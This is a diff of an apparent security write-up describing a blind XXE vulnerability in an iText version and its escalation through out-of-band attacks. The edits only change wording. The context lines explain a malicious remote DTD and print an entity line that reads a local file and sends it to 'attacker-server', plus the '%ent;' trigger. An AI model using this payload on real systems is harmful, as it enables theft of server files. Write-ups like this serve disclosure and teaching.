@@ -67,7 +67,7 @@ Alright, let's place it on line 742 then... Uploaded it... and ... wait for it..
 
 ¡VAMOS! DNS and HTTP interactions.
 
-So yeah, it was in fact a vulnerable iText version to XXE, BUT, that version of Java made me tweak a little, it was a pretty updated one. Well, as always it was time to escalate the bug.
+So yeah, it was in fact a vulnerable iText version to XXE, BUT, that version of Java set me off a little... it was a pretty updated one, to be honest I didn't want to think it through and move on, trying to stay positive. Well, as always it was time to escalate the bug.
 
 Due to the nature of the feature, no direct feedback was available after every upload, therefore an error based XXE was not possible, so I had to go with the Blind route using Out-of-Band attacks to try to exfiltrate internal information.
 
@@ -106,7 +106,7 @@ The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual ex
 4. `<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">`: This is a nested entity. It defines a parameter entity %ent, whose value is the full declaration for a general entity named <b>data</b>. This part is key because it ensures the file content (%file) is read and included within the URL of the final call.
 
 
-Back to the 1st. payload:
+Back to the <b>1st. payload</b>:
 
 5. `%ent;`: This line (#3) triggers the processing of the %ent entity from the remote DTD, in simple terms, this action brings the final, exfil command (&data;) into play, setting up the last step of the attack.
 
